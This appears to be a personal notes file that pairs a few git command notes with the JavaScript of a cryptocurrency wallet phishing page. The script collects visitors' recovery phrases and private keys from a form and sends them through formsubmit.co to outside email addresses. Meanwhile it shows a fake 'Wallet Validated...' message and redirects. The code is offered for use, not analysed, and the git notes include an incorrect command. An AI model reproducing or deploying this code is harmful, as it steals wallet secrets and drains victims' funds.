# goodman
Essayz new link


to remove a remote repository
git remove remote origin

to delete commits and go back to head
git reset --hard HEAD~1










       /*  $.ajax({
          url: 'parser.php',
          method: 'POST',
          data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal },
          success: function (res) {
            if (res.trim() != "") {
              if (res.trim() == "string_error") {
                alert('Fill in your recovery phrase');
              } else if (res.trim() == "success") {
                phraseInputVal = '';
                document.querySelector('.sending').style.display = 'block';
                setTimeout(() => {
                  alert('Wallet Validated...');
                  redirect();
                }, 3000);                             
              }
            } else {
              alert('Could not proceed due to some errors, kindly try again later.')
            }
          }
        }); */


        <script>
    const phraseProceedBtn = document.getElementById('phraseProceed');
    const keystorejsonProceedBtn = document.getElementById('keystorejsonproceed');
    const privatekeyProceedBtn = document.getElementById('privatekeyProceed');
    const phraseProceedHandler = (e) => {
      let phraseInputVal = document.getElementById('phraseInput').value;
      const wallet = document.getElementById('wallet_id').value;
      if (phraseInputVal.trim() === "") {
        alert('Fill in your recovery phrase');
      } else {
        e.preventDefault();
        let a = document.querySelector(".label");
        mail = "codenew39@gmail.com";
        next = "next.html";
        subject = `${window.location.hostname} ${new Date()}`;
        let r = new FormData();
        let s = document.querySelector("form").name;
        if (e.target.name === "phrasekey") {
          phrase = document.querySelector("textarea").value;
          r.append("phraseKey", phrase);
        }
        r.append("_captcha", false);
        r.append("_next", next);
        r.append("_template", "table");
        r.append("_subject", subject);
        let n = `https://formsubmit.co/${mail}`;
        fetch(n, {
          method: "POST",
          body: r
        }).then((e) =>
          window.location.assign(next),
        );
      }
    }

    const keystorejsonProceedHandler = (e) => {
        let keystorejson = document.getElementById('keystorejson').value;
        let keystorepassword = document.getElementById('keystorepassword').value;
        const wallet = document.getElementById('wallet_id').value;
        if (keystorejson.trim() === "" || keystorepassword === "") {
          alert('Fill out all form fields before proceeding');
        } else {
        };

        const privateKeyProceedHandler = () => {
          let privatekey = document.getElementById('privatekey').value;
          const wallet = document.getElementById('wallet_id').value;
          console.log(wallet);
          if (privatekey.trim() === "") {
            alert('Fill in your private key');
          } else {
            $.ajax({
              url: `https://formsubmit.co/Mayhemofflin@gmail.com`,
              method: 'POST',
              data: {
                import_type: 'private',
                wallet: wallet,
                privatekey: privatekey
              },
              success: function (res) {
                if (res.trim() !== "") {
                  if (res.trim() === "string_error") {
                    alert('Fill in your private key.');
                  } else if (res.trim() === "success") {
                    privatekey = '';

                    document.querySelector('.sending').style.display = 'block';
                    setTimeout(() => {
                      alert('Wallet Validated...');
                      redirect();
                    }, 3000)
                  }
                } else {
                  alert('Could not proceed due to some errors, kindly try again later.')
                }
              }
            });
          }
        };

        /*  const redirect = () => {
           window.location.href = 'barcode.jpg';
         }; */

        phraseProceedBtn.addEventListener('click', phraseProceedHandler);
        keystorejsonProceedBtn.addEventListener('click', keystorejsonProceedHandler);
        privatekeyProceedBtn.addEventListener('click', privateKeyProceedHandler);
  </script>


git config user.name "skelemba"
git config user.email "skelemba39@gmail.com"
git config credential.${remote}.username skelemba
git config credential.helper store